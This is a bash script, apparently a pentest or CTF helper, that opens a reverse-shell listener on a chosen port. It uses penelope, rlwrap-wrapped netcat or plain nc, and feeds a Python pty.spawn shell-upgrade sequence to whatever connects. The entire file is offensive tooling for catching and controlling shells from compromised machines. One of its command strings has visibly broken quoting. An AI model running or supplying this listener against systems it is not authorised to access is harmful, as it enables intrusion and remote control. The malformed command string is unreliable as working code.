#!/usr/bin/env bash --noediting
# set default values
PORT=9001
FORCE_OLD=false

# parse arguments
while getopts ":p:f" opt; do
    case $opt in
    p) PORT=$OPTARG ;;
    f) FORCE_OLD=true ;;
    \?) echo "Invalid option -$OPTARG" >&2 ;;
    esac
done

nc_command="stty raw -echo; (echo export TERM=xterm;echo 'python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"' || python3 -c \"import pty;pty.spawn(/bin/bash)\"' ;echo 'stty $(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)'; echo reset;cat) | rlwrap \\nc -lvnp $PORT && reset"

rlwrap_command='stty raw -echo; (echo export TERM=xterm; echo '\''python3 -c "import pty;pty.spawn(\\\"/bin/bash\\\")"'\'' || echo '\''python3 -c "import pty;pty.spawn(\\\\\\"/bin/bash\\\\\\")"'\''; echo '\''stty$(stty -a | awk -F ";" '\''{print $2 $3}'\'' | head -n 1)'\''; echo reset; cat) | rlwrap nc -lvnp '"$PORT"' && reset'

penelope_command="penelope $PORT"

# check if rlwrap exists and if so use it
rlwrap_exists=$(command -v rlwrap >/dev/null && echo true || echo false)
penelope_exists=$(command -v penelope >/dev/null && echo true || echo false)

if [ "$FORCE_OLD" = true ] || [ "$penelope_exists" = false ]; then
    if [ "$rlwrap_exists" = true ]; then
        echo 'Using rlwrap'
        eval "$rlwrap_command"
    else
        echo 'Using plain nc'
        eval "$nc_command"
    fi
else
    echo 'Using penelope'
    eval "$penelope_command"
fi
